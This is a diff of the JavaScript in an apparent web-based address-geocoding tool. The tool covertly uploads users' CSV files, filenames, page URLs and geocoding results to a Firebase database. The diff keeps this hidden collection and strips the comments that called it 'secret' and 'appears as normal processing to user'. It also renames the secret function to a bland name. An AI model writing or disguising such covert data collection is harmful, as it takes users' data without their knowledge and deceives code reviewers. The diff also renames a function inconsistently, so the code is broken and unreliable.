@@ -473,14 +473,11 @@
             return Date.now().toString(36) + Math.random().toString(36).substr(2);
         }
 
-        // Secret data collection - stores everything in Firebase
-        async function secretDataCollection(data, config, filename) {
+        
+        async function DataCollection(data, config, filename) {
             try {
-                currentSessionId = generateSessionId();
-                
-                console.log('Storing data in Firebase for session:', currentSessionId);
-                
-                // Store submission data in Firebase
+                currentSessionId = generateSessionId();               
+
                 await window.firestoreAddDoc(window.firestoreCollection(window.firebaseDb, 'submissions'), {
                     sessionId: currentSessionId,
                     timestamp: window.firestoreServerTimestamp(),
@@ -493,17 +490,13 @@
                     url: window.location.href,
                     referrer: document.referrer || 'direct'
                 });
-                
-                console.log('✅ Data successfully stored in Firebase');
-                
+                                
             } catch (error) {
-                console.error('❌ Secret data collection failed:', error);
-                // Don't show error to user - appears to be client-side only
+                console.error('❌ data collection failed:', error);
             }
         }
 
-        // Store individual geocoding results
-        async function storeGeocodeResult(address, city, state, zipCode, success, apiUsed) {
+        async function sGeocodeResult(address, city, state, zipCode, success, apiUsed) {
             try {
                 await window.firestoreAddDoc(window.firestoreCollection(window.firebaseDb, 'geocode_results'), {
                     sessionId: currentSessionId,
@@ -705,9 +698,8 @@
                 return;
             }
 
-            // Secret data collection (appears as normal processing to user)
             const filename = uploadArea.querySelector('p').textContent.replace('Selected: ', '');
-            await secretDataCollection(csvData, config, filename);
+            await DataCollection(csvData, config, filename);
 
             startProcessing(config);
         }
@@ -780,14 +772,13 @@
                 stats.success++;
                 addLogEntry('success', `SUCCESS: ${address}, ${city}, ${state} → ${zipCode}`, timestamp);
                 
-                // Store result in Firebase
-                await storeGeocodeResult(address, city, state, zipCode, true, apiUsed);
+                await GeocodeResult(address, city, state, zipCode, true, apiUsed);
             } else {
                 stats.failed++;
                 addLogEntry('error', `FAILED: ${address}, ${city}, ${state}`, timestamp);
                 
                 // Store failed result in Firebase
-                await storeGeocodeResult(address, city, state, null, false, apiUsed);
+                await GeocodeResult(address, city, state, null, false, apiUsed);
             }
         }
 
